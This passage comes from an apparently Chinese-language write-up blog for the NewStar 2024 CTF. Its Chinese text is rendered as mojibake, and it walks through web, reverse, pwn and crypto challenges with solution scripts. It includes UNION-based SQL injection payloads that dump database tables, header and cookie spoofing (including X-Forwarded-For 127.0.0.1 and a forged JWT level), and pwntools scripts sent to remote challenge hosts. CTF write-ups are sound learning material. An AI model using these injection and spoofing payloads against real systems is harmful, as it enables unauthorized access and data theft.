</span></span><span style=display:flex><span>    $reversed_cmd <span style=color:#f92672>.=</span> $cmd[$i];
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>$hashed_reversed_cmd<span style=color:#f92672>=</span><span style=color:#a6e22e>md5</span>($reversed_cmd);
</span></span><span style=display:flex><span>$decode_key<span style=color:#f92672>=</span>$hashed_reversed_cmd;
</span></span><span style=display:flex><span>$key<span style=color:#f92672>=</span><span style=color:#a6e22e>base64_encode</span>($decode_key);
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> $cmd;
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> $key;
</span></span></code></pre></div><p>å°†å¾—åˆ°çš„å¯¹åº”å†…å®¹è¿›è¡Œpostå‘åŒ…å³å¯</p><h3 id=pangbai-è¿‡å®¶å®¶1>PangBai è¿‡å®¶å®¶ï¼ˆ1ï¼‰</h3><p>ä½“æ„Ÿä¸ç®—å¥½ï¼Œä½†æ˜¯é¢˜ç›®å¾ˆå¥½ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆè¿™ä¹ˆå¡çš„åŸå› </p><p>ç¬¬ä¸€å±‚æ²¡æ€ä¹ˆçœ‹æ˜ç™½ï¼Œç®€å•çš„æŠ“åŒ…åä¿®æ”¹ä¸€ä¸‹headeré‡Œçš„cookieçœ‹ç½‘ç»œå›æ˜¾locationè¿›å…¥ç¬¬äºŒå±‚</p><p>ç¬¬äºŒå±‚æ¢cookieï¼Œgetå‘åŒ…?ask=miao</p><p>ç¬¬ä¸‰å±‚postå‘åŒ…say=hello</p><p>ç¬¬å››å±‚æ”¹ä¸ªrefererï¼Œå†æŠŠagentæ”¹ä¸€ä¸‹æŠŠfirefoxæ”¹æˆPapaå°±è¡Œäº†</p><p>è¿™å±‚å¥½åƒä¹Ÿè¦æ”¹ä¸ºsay=ç›å¡å·´å¡é˜¿å¡å“‡å¡ç±³å¡ç›å¡å‘£</p><p>ç¬¬äº”å±‚å¥½åƒæ˜¯å‘patchï¼Œæˆ‘æ˜¯pythonè¿›è¡Œå‘åŒ…çš„</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> requests
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># ç›®æ ‡ URL</span>
</span></span><span style=display:flex><span>url <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;http://101.200.139.65:25030/?ask=Papa&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># æ„é€ æ–‡ä»¶ä¸Šä¼ éƒ¨åˆ†å’Œå­—ç¬¦ä¸²å‚æ•°</span>
</span></span><span style=display:flex><span>files <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#39;file&#39;</span>: (<span style=color:#e6db74>&#39;patch.zip&#39;</span>, open(<span style=color:#e6db74>&#39;1.zip&#39;</span>, <span style=color:#e6db74>&#39;rb&#39;</span>))}
</span></span><span style=display:flex><span>data <span style=color:#f92672>=</span> {
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;say&#39;</span>: <span style=color:#e6db74>&#39;ç›å¡å·´å¡é˜¿å¡å“‡å¡ç±³å¡ç›å¡å‘£&#39;</span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># æ·»åŠ å¿…è¦çš„ headers</span>
</span></span><span style=display:flex><span>headers <span style=color:#f92672>=</span> {
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;Cookie&#39;</span>: <span style=color:#e6db74>&#39;token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJsZXZlbCI6MH0.J62yrWvSS_4OY6g19WR70lIq5DBRs70ISiH1rf8OUB0&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;Referer&#39;</span>: <span style=color:#e6db74>&#39;http://101.200.139.65:35208/?ask=Papa&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;User-Agent&#39;</span>: <span style=color:#e6db74>&#39;Papa/5.0 (Windows NT 10.0; Win64; x64)&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;Accept&#39;</span>: <span style=color:#e6db74>&#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;Origin&#39;</span>: <span style=color:#e6db74>&#39;http://101.200.139.65:35208&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;X-Forwarded-For&#39;</span>:<span style=color:#e6db74>&#39;127.0.0.1&#39;</span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># å‘é€ PATCH è¯·æ±‚</span>
</span></span><span style=display:flex><span>response <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>patch(url, files<span style=color:#f92672>=</span>files, data<span style=color:#f92672>=</span>data, headers<span style=color:#f92672>=</span>headers)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># æ‰“å°æœåŠ¡å™¨è¿”å›çš„å“åº”</span>
</span></span><span style=display:flex><span>print(response<span style=color:#f92672>.</span>text)
</span></span></code></pre></div><p>ç¬¬å…­å±‚å¥½åƒæ˜¯jwtçš„æ›´æ”¹ï¼Œé¢˜ç›®ç»™äº†å¯†é’¥ç›´æ¥åœ¨ç½‘ç«™ä¸Šæ”¹ä¸ºlevel0å†å¸¦å…¥è¿›è¡Œäº†</p><p><img alt=13 loading=lazy src=/posts/ctf/newstar2024/13.png></p><p>æœ€åå¸¦å…¥è¿›è¡Œä¿®æ”¹æˆ‘æŠŠåŒ…åˆå¸¦åˆ°bpçš„è‡ªå¸¦æµè§ˆå™¨é‡Œé¢å¾—åˆ°æœ€åçš„flag,æŒ‰ä¸€ä¸‹é†’æ¥ç­‰flagå°±è¡Œäº†</p><p><img alt=14 loading=lazy src=/posts/ctf/newstar2024/14.png></p><h3 id=è°¢è°¢çš®è›‹>è°¢è°¢çš®è›‹</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#f92672>-</span><span style=color:#ae81ff>1</span> <span style=color:#66d9ef>union</span> <span style=color:#66d9ef>select</span> <span style=color:#ae81ff>1</span>,<span style=color:#66d9ef>database</span>()<span style=color:#f92672>#</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#f92672>-</span><span style=color:#ae81ff>1</span> <span style=color:#66d9ef>union</span> <span style=color:#66d9ef>select</span> <span style=color:#ae81ff>1</span>,group_concat(<span style=color:#66d9ef>table_name</span>) <span style=color:#66d9ef>from</span> information_schema.tables <span style=color:#66d9ef>where</span> table_schema<span style=color:#f92672>=</span><span style=color:#66d9ef>database</span>()<span style=color:#f92672>#</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#f92672>-</span><span style=color:#ae81ff>1</span> <span style=color:#66d9ef>union</span> <span style=color:#66d9ef>select</span> <span style=color:#ae81ff>1</span>,group_concat(<span style=color:#66d9ef>column_name</span>) <span style=color:#66d9ef>from</span> information_schema.columns <span style=color:#66d9ef>where</span> <span style=color:#66d9ef>table_name</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#39;Fl4g&#39;</span><span style=color:#f92672>#</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#f92672>-</span><span style=color:#ae81ff>1</span> <span style=color:#66d9ef>union</span> <span style=color:#66d9ef>select</span> <span style=color:#ae81ff>1</span>,group_concat(id,des,value) <span style=color:#66d9ef>from</span> Fl4g<span style=color:#f92672>#</span>
</span></span></code></pre></div><h2 id=re>Re</h2><h3 id=begin>begin</h3><p>è·Ÿç€æµç¨‹åšï¼Œä¸€å…±ä¸‰ä¸ªéƒ¨åˆ†ï¼Œf5ç„¶åa,shiftf12,x</p><p>flag{Mak3_aN_3Ff0rt_tO_5eArcH_F0r_th3_f14g_C0Rpse}</p><h3 id=base64>base64</h3><p>ç®€å•çš„base64æ¢è¡¨</p><p><img alt=7 loading=lazy src=/posts/ctf/newstar2024/7.png></p><h3 id=ezandroidstudy>ezAndroidStudy</h3><p>ä½¿ç”¨å·¥å…·æ˜¯jeb</p><p>flag1å’Œflag2ç›´æ¥å…¨å±€æœç´¢å¾—åˆ°flagéƒ¨åˆ†ï¼Œflag2åœ¨æ³¨é‡Šé‡Œï¼Œå¿˜æˆªå±äº†</p><p><img alt=8 loading=lazy src=/posts/ctf/newstar2024/8.png></p><p>flag3åœ¨xmlä¸­</p><p><img alt=9 loading=lazy src=/posts/ctf/newstar2024/9.png></p><p>flag4ä¹Ÿæ˜¯æœç´¢ç„¶ååœ¨æ³¨é‡Šé‡Œå¾—åˆ°</p><p><img alt=10 loading=lazy src=/posts/ctf/newstar2024/10.png></p><p>flag5åœ¨soé‡Œé¢å¯¼å‡ºç„¶åå¸¦å…¥idaé€†å‘ä¸€ä¸‹</p><p><img alt=11 loading=lazy src=/posts/ctf/newstar2024/11.png></p><h3 id=simple_encryption>Simple_encryption</h3><p>idaç„¶åf5çœ‹mainå‡½æ•°ï¼Œä¸€ä¸ªç®€å•çš„å¼‚æˆ–ï¼Œå®šä½ä¸€ä¸‹å¯†é’¥ï¼Œç®€å•çš„è„šæœ¬å¸¦å…¥</p><p><img alt=12 loading=lazy src=/posts/ctf/newstar2024/12.png></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> idaapi <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>decoded <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>30</span>):
</span></span><span style=display:flex><span>    enc <span style=color:#f92672>=</span> get_byte(<span style=color:#ae81ff>0x403020</span> <span style=color:#f92672>+</span> i)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> i <span style=color:#f92672>%</span> <span style=color:#ae81ff>3</span> <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>:
</span></span><span style=display:flex><span>        enc <span style=color:#f92672>=</span> (enc <span style=color:#f92672>+</span> <span style=color:#ae81ff>31</span>) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xFF</span> 
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>elif</span> i <span style=color:#f92672>%</span> <span style=color:#ae81ff>3</span> <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span>:
</span></span><span style=display:flex><span>        enc <span style=color:#f92672>=</span> (enc <span style=color:#f92672>-</span> <span style=color:#ae81ff>41</span>) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xFF</span> 
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:  <span style=color:#75715e># i % 3 == 2</span>
</span></span><span style=display:flex><span>        enc <span style=color:#f92672>^=</span> <span style=color:#ae81ff>0x55</span>
</span></span><span style=display:flex><span>    decoded <span style=color:#f92672>+=</span> chr(enc)
</span></span><span style=display:flex><span>print(decoded)
</span></span></code></pre></div><h3 id=ez_debug>ez_debug</h3><p>idaæ‰“å¼€ç®€å•çš„çœ‹ä¸€ä¸‹åˆ¤æ–­flagåä¼šå¯¹å¯†æ–‡è¿›è¡Œè§£å¯†</p><p><img alt=15 loading=lazy src=/posts/ctf/newstar2024/21.png>å¯ä»¥ç”¨x64dbgæ‰“æ–­ç‚¹å¾—åˆ°flag</p><p><img alt=15 loading=lazy src=/posts/ctf/newstar2024/20.png></p><h2 id=pwn>pwn</h2><h3 id=real-login>Real Login</h3><p>æœ‰é™„ä»¶è¿›è¡Œä¸‹è½½ï¼Œidaçš„f5å¾—åˆ°å¯†é’¥ï¼Œç›´æ¥cat flagå°±è¡Œ</p><p><img alt=15 loading=lazy src=/posts/ctf/newstar2024/15.png></p><h3 id=game>Game</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#39;39.106.48.123&#39;</span>, <span style=color:#ae81ff>30474</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#34;Let&#39;s play a game!&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> _ <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>100</span>):
</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>&#39;10&#39;</span>) 
</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#34;pls input you num: &#34;</span>)  
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>interactive() 
</span></span></code></pre></div><p><img alt=16 loading=lazy src=/posts/ctf/newstar2024/16.png></p><p>å¤§æ¦‚çš„æ€è·¯å°±æ˜¯åœ¨5uå†…å¡«å…¥æ•°å­—æœ€åå¤§äº999å³å¯ï¼Œç„¶åå°±å¯ä»¥è¿›å…¥æ‰§è¡Œå‘½ä»¤äº†</p><h3 id=overwrite>overwrite</h3><p><img alt=16 loading=lazy src=/posts/ctf/newstar2024/17.png></p><p>æœ‰é•¿åº¦é™åˆ¶é€šè¿‡è¾“å…¥-1è¿›è¡Œç»•è¿‡ï¼Œåœ¨readå‡½æ•°ä¸­ä¼šè½¬æ¢ä¸ºunsigned intç±»å‹å…è®¸è¯»å–å¤§é‡æ•°æ®</p><p><code>nbytes_4</code> åœ¨æ ˆä¸­æœ‰å›ºå®šå¤§å°ï¼ˆ0x30ï¼‰ï¼Œå¡«å…… 0x30 å­—èŠ‚åï¼Œå¯ä»¥è¦†ç›–è¿”å›åœ°å€ã€‚</p><p><code>atoi</code> çš„è¾“å…¥å­—ç¬¦ä¸²åœ¨å¯å¤„ç†çš„èŒƒå›´å†…ï¼ˆå³ä¸è¶…è¿‡ <code>2147483647</code>ï¼‰ï¼Œå¦åˆ™å¯èƒ½å¯¼è‡´æœªå®šä¹‰è¡Œä¸ºï¼Œè¿”å›0</p><p>æ‰€ä»¥è¾“å…¥(0x30+0x06)ä¸ªæ•°å­—å³å¯</p><p><img alt=18 loading=lazy src=/posts/ctf/newstar2024/18.png></p><h3 id=gdb>gdb</h3><p>idaç®€å•çš„çœ‹ä¸€ä¸‹</p><p><img loading=lazy src=/posts/ctf/newstar2024/19.png></p><p>ç”¨pwndbgè¿›è¡ŒæŸ¥çœ‹ï¼Œencåœ¨<code>rbp-0x439</code>ï¼Œ<code>4557455355431d45</code>åŒæ—¶æ³¨æ„æœ‰ä¸å¯è§å­—ç¬¦\x1d</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>p<span style=color:#f92672>=</span>remote(<span style=color:#e6db74>&#34;101.200.139.65&#34;</span>,<span style=color:#ae81ff>25014</span>)
</span></span><span style=display:flex><span>s<span style=color:#f92672>=</span>p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;data:&#39;</span>)
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x5d\x1d\x43\x55\x53\x45\x57\x45</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>interactive()
</span></span></code></pre></div><p><img alt=18 loading=lazy src=/posts/ctf/newstar2024/22.png></p><p>week2</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> requests
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> bs4 <span style=color:#f92672>import</span> BeautifulSoup
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>session <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>Session()
</span></span><span style=display:flex><span>url <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;http://eci-2zea4sz6ovy11afw7m58.cloudeci1.ichunqiu.com/start&#39;</span>
</span></span><span style=display:flex><span>res <span style=color:#f92672>=</span> session<span style=color:#f92672>.</span>get(url)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>soup <span style=color:#f92672>=</span> BeautifulSoup(res<span style=color:#f92672>.</span>text, <span style=color:#e6db74>&#39;html.parser&#39;</span>)
</span></span><span style=display:flex><span>text <span style=color:#f92672>=</span> soup<span style=color:#f92672>.</span>find(<span style=color:#e6db74>&#39;p&#39;</span>, id<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;text&#39;</span>)<span style=color:#f92672>.</span>get_text()
</span></span><span style=display:flex><span>user_input <span style=color:#f92672>=</span> text
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>post_url <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;http://eci-2zea4sz6ovy11afw7m58.cloudeci1.ichunqiu.com/submit&#39;</span>  <span style=color:#75715e># æ›¿æ¢ä¸ºå®é™…çš„ POST URL</span>
</span></span><span style=display:flex><span>data <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#39;user_input&#39;</span>: user_input}  <span style=color:#75715e># è®¾ç½® POST æ•°æ®</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># å‘é€ POST è¯·æ±‚</span>
</span></span><span style=display:flex><span>response <span style=color:#f92672>=</span> session<span style=color:#f92672>.</span>post(post_url, data<span style=color:#f92672>=</span>data)
</span></span><span style=display:flex><span>print(response<span style=color:#f92672>.</span>text)
</span></span></code></pre></div><h1 id=week2>week2</h1><h2 id=crypto-1>Crypto</h2><h3 id=è¿™æ˜¯å‡ æ¬¡æ–¹-ç–‘æƒ‘>è¿™æ˜¯å‡ æ¬¡æ–¹ï¼Ÿ ç–‘æƒ‘ï¼</h3><p>åŠ æ³•çš„è¿ç®—é€»è¾‘åœ¨^ä¹‹å‰</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.Util.number <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># å·²çŸ¥å‚æ•°</span>
</span></span><span style=display:flex><span>n <span style=color:#f92672>=</span> <span style=color:#ae81ff>124455847177872829086850368685666872009698526875425204001499218854100257535484730033567552600005229013042351828575037023159889870271253559515001300645102569745482135768148755333759957370341658601268473878114399708702841974488367343570414404038862892863275173656133199924484523427712604601606674219929087411261</span>
</span></span><span style=display:flex><span>e <span style=color:#f92672>=</span> <span style=color:#ae81ff>65537</span>
</span></span><span style=display:flex><span>c <span style=color:#f92672>=</span> <span style=color:#ae81ff>36513006092776816463005807690891878445084897511693065366878424579653926750135820835708001956534802873403195178517427725389634058598049226914694122804888321427912070308432512908833529417531492965615348806470164107231108504308584954154513331333004804817854315094324454847081460199485733298227480134551273155762</span>
</span></span><span style=display:flex><span>hint <span style=color:#f92672>=</span> <span style=color:#ae81ff>12578819356802034679792891975754306960297043516674290901441811200649679289740456805726985390445432800908006773857670255951581884098015799603908242531673390</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># æ­¥éª¤ 1: æ¢å¤ p</span>
</span></span><span style=display:flex><span>p <span style=color:#f92672>=</span> hint <span style=color:#f92672>^</span> (e <span style=color:#f92672>+</span> <span style=color:#ae81ff>10086</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># æ­¥éª¤ 2: è®¡ç®— q</span>
</span></span><span style=display:flex><span>q <span style=color:#f92672>=</span> n <span style=color:#f92672>//</span> p
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># æ­¥éª¤ 3: è®¡ç®— d (ç§é’¥)</span>
</span></span><span style=display:flex><span>phi <span style=color:#f92672>=</span> (p <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>) <span style=color:#f92672>*</span> (q <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>d <span style=color:#f92672>=</span> pow(e, <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>, phi)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># æ­¥éª¤ 4: è§£å¯†å¯†æ–‡</span>
</span></span><span style=display:flex><span>m <span style=color:#f92672>=</span> pow(c, d, n)
</span></span><span style=display:flex><span>flag <span style=color:#f92672>=</span> long_to_bytes(m)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print(flag<span style=color:#f92672>.</span>decode())
</span></span></code></pre></div><h3 id=just-one-and-more-than-two>Just one and more than two</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.Util.number <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># å·²çŸ¥å‚æ•°</span>
</span></span><span style=display:flex><span>p <span style=color:#f92672>=</span> <span style=color:#ae81ff>11867061353246233251584761575576071264056514705066766922825303434965272105673287382545586304271607224747442087588050625742380204503331976589883604074235133</span>
</span></span><span style=display:flex><span>q <span style=color:#f92672>=</span> <span style=color:#ae81ff>11873178589368883675890917699819207736397010385081364225879431054112944129299850257938753554259645705535337054802699202512825107090843889676443867510412393</span>
</span></span><span style=display:flex><span>r <span style=color:#f92672>=</span> <span style=color:#ae81ff>12897499208983423232868869100223973634537663127759671894357936868650239679942565058234189535395732577137079689110541612150759420022709417457551292448732371</span>
</span></span><span style=display:flex><span>c1 <span style=color:#f92672>=</span> <span style=color:#ae81ff>8705739659634329013157482960027934795454950884941966136315983526808527784650002967954059125075894300750418062742140200130188545338806355927273170470295451</span>
</span></span><span style=display:flex><span>c2 <span style=color:#f92672>=</span> <span style=color:#ae81ff>1004454248332792626131205259568148422136121342421144637194771487691844257449866491626726822289975189661332527496380578001514976911349965774838476334431923162269315555654716024616432373992288127966016197043606785386738961886826177232627159894038652924267065612922880048963182518107479487219900530746076603182269336917003411508524223257315597473638623530380492690984112891827897831400759409394315311767776323920195436460284244090970865474530727893555217020636612445</span>
</span></span><span style=display:flex><span>e <span style=color:#f92672>=</span> <span style=color:#ae81ff>65537</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># æ­¥éª¤ 1: ä» c1 è§£å¯†</span>
</span></span><span style=display:flex><span>d1 <span style=color:#f92672>=</span> pow(e, <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>, p <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>m1 <span style=color:#f92672>=</span> pow(c1, d1, p)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># æ­¥éª¤ 2: è®¡ç®— N å’Œ phi(N)</span>
</span></span><span style=display:flex><span>N <span style=color:#f92672>=</span> p <span style=color:#f92672>*</span> q <span style=color:#f92672>*</span> r
</span></span><span style=display:flex><span>phi_N <span style=color:#f92672>=</span> (p <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>) <span style=color:#f92672>*</span> (q <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>) <span style=color:#f92672>*</span> (r <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># æ­¥éª¤ 3: ä» c2 è§£å¯†</span>
</span></span><span style=display:flex><span>d2 <span style=color:#f92672>=</span> pow(e, <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>, phi_N)
</span></span><span style=display:flex><span>m2 <span style=color:#f92672>=</span> pow(c2, d2, N)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># æ‹¼æ¥æ˜æ–‡</span>
</span></span><span style=display:flex><span>flag <span style=color:#f92672>=</span> long_to_bytes(m1) <span style=color:#f92672>+</span> long_to_bytes(m2)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print(flag<span style=color:#f92672>.</span>decode())
</span></span></code></pre></div><h3 id=since-you-konw-something>Since you konw something</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.Util.number <span style=color:#f92672>import</span> long_to_bytes
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>xor_bytes</span>(a, b):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> bytes(x <span style=color:#f92672>^</span> y <span style=color:#66d9ef>for</span> x, y <span style=color:#f92672>in</span> zip(a, b <span style=color:#f92672>*</span> (len(a) <span style=color:#f92672>//</span> len(b) <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>)))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>c <span style=color:#f92672>=</span> <span style=color:#ae81ff>218950457292639210021937048771508243745941011391746420225459726647571</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Convert c back to bytes</span>
</span></span><span style=display:flex><span>c_bytes <span style=color:#f92672>=</span> long_to_bytes(c)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Function to try decryption with a given key</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>try_decrypt</span>(key):
</span></span><span style=display:flex><span>    decrypted <span style=color:#f92672>=</span> xor_bytes(c_bytes, key)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> decrypted<span style=color:#f92672>.</span>startswith(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;flag{&#39;</span>) <span style=color:#f92672>and</span> decrypted<span style=color:#f92672>.</span>endswith(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;}&#39;</span>):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> decrypted<span style=color:#f92672>.</span>decode()
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>None</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Try all possible single-byte keys</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>256</span>):
</span></span><span style=display:flex><span>    key <span style=color:#f92672>=</span> bytes([i])
</span></span><span style=display:flex><span>    result <span style=color:#f92672>=</span> try_decrypt(key)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> result:
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Found flag with key </span><span style=color:#e6db74>{</span>key<span style=color:#f92672>.</span>hex()<span style=color:#e6db74>}</span><span style=color:#e6db74>: </span><span style=color:#e6db74>{</span>result<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># If single-byte key doesn&#39;t work, try short strings</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> result:
</span></span><span style=display:flex><span>    <span style=color:#f92672>import</span> string
</span></span><span style=display:flex><span>    <span style=color:#f92672>import</span> itertools
</span></span><span style=display:flex><span>    chars <span style=color:#f92672>=</span> string<span style=color:#f92672>.</span>printable<span style=color:#f92672>.</span>encode()
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> length <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>5</span>):  <span style=color:#75715e># Try keys up to 4 characters long</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> key <span style=color:#f92672>in</span> itertools<span style=color:#f92672>.</span>product(chars, repeat<span style=color:#f92672>=</span>length):
</span></span><span style=display:flex><span>            key <span style=color:#f92672>=</span> bytes(key)
